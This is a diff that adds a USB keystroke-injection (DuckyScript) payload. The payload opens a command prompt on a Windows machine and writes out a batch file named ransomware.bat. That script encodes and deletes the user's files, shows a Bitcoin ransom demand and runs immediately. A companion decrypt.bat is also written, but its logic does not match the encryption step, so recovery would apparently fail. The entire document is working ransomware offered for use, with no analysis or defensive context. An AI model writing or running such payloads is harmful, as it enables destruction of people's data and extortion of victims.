@@ -1,0 +1,71 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd /c
+ENTER
+DELAY 500
+REM Create ransomware script
+STRING echo @echo off > "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo setlocal enabledelayedexpansion >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo for /r "%%D" in (*) do ( >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo     if not "%%~xD"==".bat" ( >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo         certutil -encode -f "%%D" "%%D.enc" >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo         del "%%D" >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo         ren "%%D.enc" "%%D" >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo     ) >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo ) >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo echo YOUR FILES HAVE BEEN ENCRYPTED! >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo echo Send 0.5 BTC to wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo echo To decrypt files, run: decrypt.bat >> "%TEMP%\ransomware.bat"
+ENTER
+DELAY 500
+STRING echo decrypt.bat > "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+STRING echo @echo off > "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+STRING echo echo Decrypting files... >> "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+STRING echo for /r "%%D" in (*.enc) do ( >> "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+STRING echo     certutil -decode -f "%%D" "%%~nD" >> "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+STRING echo     del "%%D" >> "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+STRING echo ) >> "%TEMP%\decrypt.bat"
+ENTER
+DELAY 500
+REM Execute ransomware
+STRING start "" "%TEMP%\ransomware.bat"
+ENTER
+DELAY 1000
+REM Hide command prompt
+STRING exit
+ENTER
